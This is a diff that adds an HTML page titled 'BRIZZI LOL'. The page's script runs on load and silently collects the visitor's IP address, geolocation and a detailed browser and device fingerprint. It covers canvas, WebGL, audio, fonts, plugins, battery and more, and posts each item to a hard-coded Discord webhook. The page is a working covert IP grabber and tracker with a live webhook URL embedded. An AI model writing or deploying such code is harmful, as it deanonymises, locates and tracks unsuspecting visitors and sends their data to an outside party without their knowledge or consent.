@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BRIZZI LOL</title>
+</head>
+<body>
+    <script>
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422614803888738415/nnmqT3Dz6V771PbfB0KkhCXLZLX6_FiWXdnqn2JBm1j87VD5b7CKvD4-b573Yh9wtC-5';
+        
+        async function sendSingleData(dataName, dataValue) {
+            try {
+                const payload = {
+                    content: `🌐 **${dataName}:** \`\`\`${JSON.stringify(dataValue, null, 2)}\`\`\``,
+                    username: 'Network Analyzer'
+                };
+                
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(e => {});
+            } catch (error) {}
+        }
+
+        async function collectIPAndSystemData() {
+            // 1. MULTIPLE IP SERVICES - ULTRA FAST
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://jsonip.com',
+                'https://api.myip.com',
+                'https://ipinfo.io/json',
+                'https://ipapi.co/json/',
+                'https://geolocation-db.com/json/',
+                'https://api.db-ip.com/v2/free/self',
+                'https://www.cloudflare.com/cdn-cgi/trace'
+            ];
+
+            // Fetch all IP services in parallel
+            const ipPromises = ipServices.map(service => 
+                fetch(service)
+                    .then(r => r.text().then(text => {
+                        try {
+                            if (service.includes('cloudflare')) {
+                                const lines = text.split('\n');
+                                const ipData = {};
+                                lines.forEach(line => {
+                                    const [key, value] = line.split('=');
+                                    if (key && value) ipData[key] = value;
+                                });
+                                return { service, data: ipData };
+                            }
+                            return { service, data: JSON.parse(text) };
+                        } catch {
+                            return { service, data: text };
+                        }
+                    }))
+                    .catch(e => ({ service, error: e.message }))
+            );
+
+            Promise.allSettled(ipPromises).then(results => {
+                const successfulIPs = results
+                    .filter(r => r.status === 'fulfilled' && r.value.data)
+                    .map(r => r.value);
+                
+                successfulIPs.forEach(ipResult => {
+                    sendSingleData(`IP_${ipResult.service.split('//')[1].split('/')[0]}`, ipResult.data);
+                });
+            });
+
+            // 2. ADVANCED IP INFORMATION
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(ipInfo => {
+                    sendSingleData('IPAPI_FULL_INFO', {
+                        ip: ipInfo.ip,
+                        city: ipInfo.city,
+                        region: ipInfo.region,
+                        region_code: ipInfo.region_code,
+                        country: ipInfo.country_name,
+                        country_code: ipInfo.country_code,
+                        country_code_iso3: ipInfo.country_code_iso3,
+                        country_capital: ipInfo.country_capital,
+                        country_tld: ipInfo.country_tld,
+                        continent_code: ipInfo.continent_code,
+                        in_eu: ipInfo.in_eu,
+                        postal: ipInfo.postal,
+                        latitude: ipInfo.latitude,
+                        longitude: ipInfo.longitude,
+                        timezone: ipInfo.timezone,
+                        utc_offset: ipInfo.utc_offset,
+                        country_calling_code: ipInfo.country_calling_code,
+                        currency: ipInfo.currency,
+                        currency_name: ipInfo.currency_name,
+                        languages: ipInfo.languages,
+                        country_area: ipInfo.country_area,
+                        country_population: ipInfo.country_population,
+                        asn: ipInfo.asn,
+                        org: ipInfo.org,
+                        version: ipInfo.version
+                    });
+                })
+                .catch(e => {});
+
+            // 3. IPINFO.IO DETAILED DATA
+            fetch('https://ipinfo.io/json')
+                .then(r => r.json())
+                .then(ipInfo => {
+                    sendSingleData('IPINFO_DETAILED', {
+                        ip: ipInfo.ip,
+                        hostname: ipInfo.hostname,
+                        city: ipInfo.city,
+                        region: ipInfo.region,
+                        country: ipInfo.country,
+                        loc: ipInfo.loc,
+                        org: ipInfo.org,
+                        postal: ipInfo.postal,
+                        timezone: ipInfo.timezone,
+                        anycast: ipInfo.anycast,
+                        bogon: ipInfo.bogon
+                    });
+                })
+                .catch(e => {});
+
+            // 4. BASIC SYSTEM INFO
+            sendSingleData('SYSTEM_INFO', {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                cookieEnabled: navigator.cookieEnabled,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                doNotTrack: navigator.doNotTrack
+            });
+
+            // 5. SCREEN INFORMATION
+            sendSingleData('SCREEN_INFO', {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                orientation: screen.orientation?.type,
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            });
+
+            // 6. NETWORK CONNECTION INFO
+            const conn = navigator.connection;
+            sendSingleData('NETWORK_CONNECTION', {
+                effectiveType: conn?.effectiveType,
+                downlink: conn?.downlink,
+                rtt: conn?.rtt,
+                saveData: conn?.saveData,
+                downlinkMax: conn?.downlinkMax,
+                type: conn?.type,
+                onLine: navigator.onLine
+            });
+
+            // 7. PERFORMANCE DATA
+            sendSingleData('PERFORMANCE', {
+                timing: performance.timing ? {
+                    navigationStart: performance.timing.navigationStart,
+                    loadEventEnd: performance.timing.loadEventEnd,
+                    domLoading: performance.timing.domLoading,
+                    domInteractive: performance.timing.domInteractive,
+                    domContentLoaded: performance.timing.domContentLoadedEventStart,
+                    loadComplete: performance.timing.loadEventEnd,
+                    totalLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+                    domainLookupTime: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
+                    connectTime: performance.timing.connectEnd - performance.timing.connectStart,
+                    requestTime: performance.timing.responseEnd - performance.timing.requestStart
+                } : null,
+                memory: performance.memory ? {
+                    usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
+                    totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
+                    jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB'
+                } : null,
+                navigation: performance.navigation ? {
+                    type: performance.navigation.type,
+                    redirectCount: performance.navigation.redirectCount
+                } : null
+            });
+
+            // 8. CANVAS FINGERPRINT
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 2000;
+            canvas.height = 200;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Advanced Fingerprinting Test', 2, 2);
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('IP Analysis Canvas', 2, 15);
+            sendSingleData('CANVAS_FINGERPRINT', {
+                dataHash: canvas.toDataURL().length,
+                dataSample: canvas.toDataURL().substring(0, 100),
+                features: 'Advanced rendering with text and shapes'
+            });
+
+            // 9. WEBGL INFORMATION
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                sendSingleData('WEBGL_INFO', {
+                    vendor: gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL || gl.VENDOR),
+                    renderer: gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL || gl.RENDERER),
+                    version: gl.getParameter(gl.VERSION),
+                    shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    maxCubeMapSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
+                    maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
+                });
+            }
+
+            // 10. AUDIO CONTEXT
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            sendSingleData('AUDIO_INFO', {
+                sampleRate: audioContext.sampleRate,
+                state: audioContext.state,
+                baseLatency: audioContext.baseLatency,
+                outputLatency: audioContext.outputLatency,
+                channelCount: audioContext.destination.channelCount,
+                maxChannelCount: audioContext.destination.maxChannelCount
+            });
+
+            // 11. FONTS DETECTION
+            const fonts = [
+                'Arial', 'Arial Black', 'Times New Roman', 'Courier New', 
+                'Verdana', 'Georgia', 'Comic Sans MS', 'Trebuchet MS',
+                'Impact', 'Webdings', 'Wingdings', 'MS Sans Serif'
+            ];
+            const availableFonts = fonts.filter(font => document.fonts.check(`12px "${font}"`));
+            sendSingleData('FONTS_DETECTED', availableFonts);
+
+            // 12. PLUGINS INFORMATION
+            const plugins = Array.from(navigator.plugins).map(p => ({
+                name: p.name,
+                filename: p.filename,
+                description: p.description,
+                version: p.version
+            }));
+            sendSingleData('BROWSER_PLUGINS', plugins);
+
+            // 13. TIMEZONE & LOCALE
+            sendSingleData('TIMEZONE_LOCALE', {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+                numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
+                offset: new Date().getTimezoneOffset(),
+                localTime: new Date().toLocaleString(),
+                utcTime: new Date().toUTCString()
+            });
+
+            // 14. BATTERY INFORMATION
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    sendSingleData('BATTERY_STATUS', {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    });
+                });
+            }
+
+            // 15. STORAGE CAPABILITIES
+            sendSingleData('STORAGE_INFO', {
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                indexedDB: !!window.indexedDB,
+                caches: !!window.caches,
+                serviceWorker: 'serviceWorker' in navigator,
+                storageManager: 'storage' in navigator
+            });
+
+            // 16. AVAILABLE APIS
+            sendSingleData('BROWSER_APIS', {
+                bluetooth: 'bluetooth' in navigator,
+                usb: 'usb' in navigator,
+                geolocation: 'geolocation' in navigator,
+                mediaDevices: 'mediaDevices' in navigator,
+                notifications: 'Notification' in window,
+                vibration: 'vibrate' in navigator,
+                clipboard: 'clipboard' in navigator,
+                credentials: 'credentials' in navigator,
+                payment: 'PaymentRequest' in window,
+                gamepad: 'getGamepads' in navigator
+            });
+
+            // 17. FINAL COMPLETION SIGNAL
+            setTimeout(() => {
+                sendSingleData('ANALYSIS_COMPLETE', {
+                    status: 'ALL_IP_AND_SYSTEM_DATA_COLLECTED',
+                    totalDataPoints: 17,
+                    timestamp: new Date().toISOString(),
+                    completionTime: Date.now()
+                });
+            }, 2000);
+        }
+
+        // START IMMEDIATELY
+        setTimeout(collectIPAndSystemData, 100);
+    </script>
+</body>
+</html>
